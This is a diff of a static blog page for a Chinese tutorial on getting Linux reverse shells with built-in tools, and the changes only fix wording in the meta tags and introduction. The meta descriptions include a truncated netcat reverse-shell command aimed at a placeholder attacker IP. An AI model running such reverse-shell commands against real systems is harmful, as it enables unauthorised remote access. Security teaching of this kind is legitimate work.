@@ -104,20 +104,20 @@
 
 
 
-<meta name="description" content="前言 这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。 linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。 下文中的几个例子在大多数的系统中是通用的。 这里主要重点关注一下4和5例子 下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）1.netcat  12nc &amp;lt;attacker_ip&amp;">
+<meta name="description" content="前言 这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。 linux有很多发行版，不同发行版中的内置工具、安全机制等都有所不同。 下文中的几个例子在大多数的系统中是通用的。 这里主要重点关注一下4和5例子 下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）1.netcat  12nc &amp;lt;attacker_ip&amp;gt; &amp;lt;p">
 <meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="reverse shell的几种方式">
 <meta property="og:url" content="http://kevien.github.io/2018/01/30/reverse-shell的几种方式/index.html">
 <meta property="og:site_name" content="M0rk's Blog">
-<meta property="og:description" content="前言 这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。 linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。 下文中的几个例子在大多数的系统中是通用的。 这里主要重点关注一下4和5例子 下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）1.netcat  12nc &amp;lt;attacker_ip&amp;">
+<meta property="og:description" content="前言 这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。 linux有很多发行版，不同发行版中的内置工具、安全机制等都有所不同。 下文中的几个例子在大多数的系统中是通用的。 这里主要重点关注一下4和5例子 下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）1.netcat  12nc &amp;lt;attacker_ip&amp;gt; &amp;lt;p">
 <meta property="og:image" content="http://kevien.github.io/2018/01/30/reverse-shell的几种方式/2.png">
 <meta property="og:image" content="http://kevien.github.io/2018/01/30/reverse-shell的几种方式/4.png">
 <meta property="og:image" content="http://kevien.github.io/2018/01/30/reverse-shell的几种方式/5.png">
-<meta property="og:updated_time" content="2019-04-21T15:43:04.223Z">
+<meta property="og:updated_time" content="2019-04-21T15:46:05.750Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="reverse shell的几种方式">
-<meta name="twitter:description" content="前言 这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。 linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。 下文中的几个例子在大多数的系统中是通用的。 这里主要重点关注一下4和5例子 下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）1.netcat  12nc &amp;lt;attacker_ip&amp;">
+<meta name="twitter:description" content="前言 这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。 linux有很多发行版，不同发行版中的内置工具、安全机制等都有所不同。 下文中的几个例子在大多数的系统中是通用的。 这里主要重点关注一下4和5例子 下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）1.netcat  12nc &amp;lt;attacker_ip&amp;gt; &amp;lt;p">
 <meta name="twitter:image" content="http://kevien.github.io/2018/01/30/reverse-shell的几种方式/2.png">
 
 
@@ -398,7 +398,7 @@
       
         <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
 <li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。</li>
-<li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
+<li>linux有很多发行版，不同发行版中的内置工具、安全机制等都有所不同。</li>
 <li>下文中的几个例子在大多数的系统中是通用的。</li>
 <li>这里主要重点关注一下4和5<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
 <li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
